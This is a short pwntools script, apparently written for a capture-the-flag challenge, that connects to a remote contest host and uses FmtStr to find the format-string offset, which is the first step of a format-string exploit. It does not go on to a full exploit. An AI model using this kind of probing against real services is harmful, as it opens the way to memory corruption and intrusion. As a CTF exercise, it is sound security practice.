from pwn import *
context.arch = 'amd64'

# This function sends a payload and receives the output
def send_payload(payload):
    p = remote('chirp.challs.pwnoh.io', 1337, ssl=True)
    p.sendline(payload)
    return p.recvall()

# Instantiate FmtStr to automatically find the offset
autofmt = FmtStr(send_payload)
offset = autofmt.offset

print(f"The offset is: {offset}")